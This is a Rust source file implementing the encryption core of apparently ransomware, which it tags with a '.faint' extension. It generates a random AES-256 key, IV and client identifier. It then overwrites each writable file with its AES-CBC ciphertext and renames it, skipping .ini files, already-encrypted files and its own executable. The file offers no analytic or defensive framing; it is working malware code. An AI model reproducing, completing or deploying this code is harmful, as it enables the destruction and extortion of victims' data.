use rand::{distributions::Alphanumeric, Rng};
use std::{env, fs, path};

#[derive(Debug)]
pub struct Keypair {
    pub key: String,
    pub iv: String,
}

#[derive(Debug)]
pub struct Client {
    pub keypair: Keypair,
    pub identification: String,
}

pub fn get_id() -> Client {
    let keypair = Keypair {
        key: rand_string(32),
        iv: rand_string(16),
    };

    let client = Client {
        keypair,
        identification: rand_string(24),
    };

    return client;

    fn rand_string(length: u8) -> String {
        let rng = rand::thread_rng();
        rng.sample_iter(&Alphanumeric)
            .take(length.into())
            .map(char::from)
            .collect()
    }
}

pub fn extensions(file: &path::Path) -> bool {
    if let Some(extension) = file.extension() {
        let extension = extension.to_str().unwrap();
        matches!(extension, "faint" | "ini")
    } else {
        false
    }
}

pub fn encrypt(file: &path::PathBuf, client: &Client) {
    if !file.metadata().unwrap().permissions().readonly()
        && !extensions(file)
        && file.file_name() != env::current_exe().unwrap().file_name()
    {
        println!("{}", file.display());
        if let Ok(file_content) = fs::read(file) {
            let cipher =
                libaes::Cipher::new_256(client.keypair.key.as_bytes().try_into().unwrap());
            let encrypted = cipher.cbc_encrypt(client.keypair.iv.as_bytes(), &file_content);
            if fs::write(file, encrypted).is_ok() {
                fs::rename(file, format!("{}.faint", file.display())).unwrap();
            }
        }
    }
}
